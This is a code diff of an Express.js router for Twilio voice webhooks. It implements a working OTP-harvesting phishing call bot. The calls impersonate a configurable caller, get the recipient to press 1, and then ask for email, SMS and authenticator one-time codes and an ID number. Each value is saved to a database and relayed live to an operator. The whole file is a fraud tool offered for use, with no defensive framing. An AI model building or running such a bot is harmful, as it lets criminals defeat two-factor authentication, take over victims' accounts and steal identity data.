@@ -1,119 +1,304 @@
 const express = require('express');
 const router = express.Router();
+const VoiceResponse = require('twilio').twiml.VoiceResponse;
 const db = require('../database/db');
 
-router.post('/request-action/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
-    const { action } = req.body;
+// Test endpoint
+router.get('/test', (req, res) => {
+    res.send('Webhook is working! Server is online.');
+});
+
+// MAIN VOICE RESPONSE - USING URL PARAMETER
+router.post('/voice-response/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    let currentAction = '';
-    
-    switch(action) {
-        case 'email_otp':
-            currentAction = 'waiting_for_email_otp';
-            break;
-        case 'auth_otp':
-            currentAction = 'waiting_for_auth_otp';
-            break;
-        case 'phone_otp':
-            currentAction = 'waiting_for_phone_otp';
-            break;
-        case 'id_number':
-            currentAction = 'waiting_for_id';
-            break;
-        default:
-            return res.status(400).json({ error: 'Invalid action' });
-    }
+    console.log('========== WEBHOOK CALLED ==========');
+    console.log('SessionId from URL:', sessionId);
     
     try {
-        await db.query(
-            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
-            [currentAction, sessionId]
+        const session = await db.query(
+            `SELECT cs.*, c.full_name FROM call_sessions cs 
+             JOIN contacts c ON cs.contact_id = c.id 
+             WHERE cs.id = $1`,
+            [sessionId]
         );
         
-        await db.query(
-            `INSERT INTO admin_logs (session_id, action_type) VALUES ($1, $2)`,
-            [sessionId, action]
-        );
+        if (session.rows.length === 0) {
+            console.log('Session not found:', sessionId);
+            twiml.say('Session not found. Goodbye.');
+            twiml.hangup();
+            return res.type('text/xml').send(twiml.toString());
+        }
         
-        io.emit('admin_action', { session_id: sessionId, action: action });
+        const callData = session.rows[0];
+        const currentAction = callData.current_action;
+        const fullName = callData.full_name;
+        const subject = callData.subject;
+        const customIntro = callData.custom_intro;
         
-        res.json({ success: true, action: action });
+        console.log('Current Action:', currentAction);
+        console.log('Full Name:', fullName);
+        
+        // Handle different actions
+        if (currentAction === 'consent') {
+            const gather = twiml.gather({
+                numDigits: 1,
+                action: `/webhooks/handle-consent/${sessionId}`,
+                method: 'POST',
+                timeout: 10
+            });
+            
+            let greeting = fullName ? `Hello ${fullName}, ` : 'Hello our valued client, ';
+            
+            if (subject && customIntro) {
+                gather.say(`${greeting}${customIntro} Press 1 to continue.`);
+            } else if (subject) {
+                gather.say(`${greeting}This is ${subject} calling. Press 1 to continue.`);
+            } else {
+                gather.say(`${greeting}We are contacting you regarding your account. Press 1 to continue.`);
+            }
+            
+            twiml.say('We did not receive any input. Goodbye.');
+            twiml.hangup();
+            
+        } else if (currentAction === 'waiting_for_email_otp') {
+            const gather = twiml.gather({
+                numDigits: 6,
+                action: `/webhooks/collect-email-otp/${sessionId}`,
+                method: 'POST',
+                finishOnKey: '#',
+                timeout: 10
+            });
+            gather.say('Please enter the 6 digit OTP from your email followed by the pound key.');
+            twiml.say('No input received. Goodbye.');
+            twiml.hangup();
+            
+        } else if (currentAction === 'waiting_for_auth_otp') {
+            const gather = twiml.gather({
+                numDigits: 6,
+                action: `/webhooks/collect-auth-otp/${sessionId}`,
+                method: 'POST',
+                finishOnKey: '#',
+                timeout: 10
+            });
+            gather.say('Please enter the 6 digit code from your authenticator app followed by the pound key.');
+            twiml.say('No input received. Goodbye.');
+            twiml.hangup();
+            
+        } else if (currentAction === 'waiting_for_phone_otp') {
+            const gather = twiml.gather({
+                numDigits: 6,
+                action: `/webhooks/collect-phone-otp/${sessionId}`,
+                method: 'POST',
+                finishOnKey: '#',
+                timeout: 10
+            });
+            gather.say('Please enter the 6 digit OTP sent to your phone followed by the pound key.');
+            twiml.say('No input received. Goodbye.');
+            twiml.hangup();
+            
+        } else if (currentAction === 'waiting_for_id') {
+            const gather = twiml.gather({
+                numDigits: 20,
+                action: `/webhooks/collect-id/${sessionId}`,
+                method: 'POST',
+                finishOnKey: '#',
+                timeout: 10
+            });
+            gather.say('Please enter your ID number followed by the pound key.');
+            twiml.say('No input received. Goodbye.');
+            twiml.hangup();
+            
+        } else {
+            twiml.say('Please wait for admin instructions.');
+            twiml.hangup();
+        }
+        
+        res.type('text/xml');
+        res.send(twiml.toString());
+        
     } catch (error) {
-        console.error('Error requesting action:', error);
-        res.status(500).json({ error: error.message });
+        console.error('Error in voice response:', error);
+        const twiml = new VoiceResponse();
+        twiml.say('An error occurred. Please try again later.');
+        twiml.hangup();
+        res.type('text/xml');
+        res.send(twiml.toString());
     }
 });
 
-router.post('/custom-voice/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
-    const { message } = req.body;
+// HANDLE CONSENT (USER PRESSES 1)
+router.post('/handle-consent/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    try {
+    console.log('Consent received - Session:', sessionId, 'Digits:', Digits);
+    
+    if (Digits === '1') {
         await db.query(
-            `UPDATE call_sessions SET current_action = 'custom_voice' WHERE id = $1`,
+            `UPDATE call_sessions SET current_action = 'waiting_for_id' WHERE id = $1`,
             [sessionId]
         );
         
         await db.query(
-            `INSERT INTO admin_logs (session_id, action_type, action_value) VALUES ($1, $2, $3)`,
-            [sessionId, 'custom_voice', message]
+            `INSERT INTO collected_data (session_id, data_type, data_value) VALUES ($1, $2, $3)`,
+            [sessionId, 'consent', '1']
         );
         
-        io.emit('admin_action', { session_id: sessionId, action: 'custom_voice', message: message });
+        io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
         
-        res.json({ success: true, message: 'Custom voice command sent' });
-    } catch (error) {
-        console.error('Error sending custom voice:', error);
-        res.status(500).json({ error: error.message });
+        twiml.say('Thank you. Please wait.');
+        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
+        
+    } else {
+        twiml.say('You did not press 1. Goodbye.');
+        twiml.hangup();
+        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
     }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
 });
 
-router.get('/contacts', async (req, res) => {
-    try {
-        const result = await db.query(
-            `SELECT id, phone_number, full_name, email_otp, auth_otp, phone_otp, id_number, status, created_at 
-             FROM contacts ORDER BY created_at DESC`
+// COLLECT ID NUMBER
+router.post('/collect-id/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    console.log('ID Collected - Session:', sessionId, 'ID:', Digits);
+    
+    if (Digits) {
+        const session = await db.query(
+            `SELECT contact_id FROM call_sessions WHERE id = $1`,
+            [sessionId]
         );
-        res.json(result.rows);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
+        
+        await db.query(
+            `UPDATE contacts SET id_number = $1 WHERE id = $2`,
+            [Digits, session.rows[0].contact_id]
+        );
+        
+        await db.query(
+            `INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`,
+            [sessionId, session.rows[0].contact_id, 'id_number', Digits]
+        );
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
+        
+        twiml.say('Thank you. Your ID has been recorded.');
+        twiml.hangup();
+        
+        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+    } else {
+        twiml.say('No ID received. Goodbye.');
+        twiml.hangup();
     }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
 });
 
-router.get('/active-calls', async (req, res) => {
-    try {
-        const result = await db.query(
-            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, 
-                    c.phone_number, c.full_name
-             FROM call_sessions cs
-             JOIN contacts c ON cs.contact_id = c.id
-             WHERE cs.status IN ('initiated', 'in_progress', 'answered')
-             ORDER BY cs.started_at DESC`
-        );
-        res.json(result.rows);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
+// COLLECT EMAIL OTP
+router.post('/collect-email-otp/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    console.log('Email OTP Collected - Session:', sessionId, 'OTP:', Digits);
+    
+    if (Digits) {
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'email_otp', Digits]);
+        io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
+        twiml.say('Thank you.');
+        twiml.hangup();
+        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+    } else {
+        twiml.say('No OTP received. Goodbye.');
+        twiml.hangup();
     }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
 });
 
-router.get('/session-data/:sessionId', async (req, res) => {
-    try {
-        const result = await db.query(
-            `SELECT cd.*, c.full_name, c.phone_number 
-             FROM collected_data cd
-             JOIN call_sessions cs ON cd.session_id = cs.id
-             JOIN contacts c ON cs.contact_id = c.id
-             WHERE cd.session_id = $1
-             ORDER BY cd.collected_at DESC`,
-            [req.params.sessionId]
-        );
-        res.json(result.rows);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
+// COLLECT AUTH OTP
+router.post('/collect-auth-otp/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    console.log('Auth OTP Collected - Session:', sessionId, 'OTP:', Digits);
+    
+    if (Digits) {
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'auth_otp', Digits]);
+        io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
+        twiml.say('Thank you.');
+        twiml.hangup();
+        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+    } else {
+        twiml.say('No code received. Goodbye.');
+        twiml.hangup();
     }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
+});
+
+// COLLECT PHONE OTP
+router.post('/collect-phone-otp/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    console.log('Phone OTP Collected - Session:', sessionId, 'OTP:', Digits);
+    
+    if (Digits) {
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'phone_otp', Digits]);
+        io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
+        twiml.say('Thank you.');
+        twiml.hangup();
+        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+    } else {
+        twiml.say('No OTP received. Goodbye.');
+        twiml.hangup();
+    }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
+});
+
+// CALL STATUS CALLBACK
+router.post('/call-status/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { CallStatus, Duration } = req.body;
+    const io = req.app.get('io');
+    
+    console.log('Call Status - Session:', sessionId, 'Status:', CallStatus, 'Duration:', Duration);
+    
+    if (sessionId) {
+        await db.query(
+            `UPDATE call_sessions SET status = $1, duration_seconds = $2 WHERE id = $3`,
+            [CallStatus, Duration || 0, sessionId]
+        );
+        io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
+    }
+    
+    res.sendStatus(200);
 });
 
 module.exports = router;
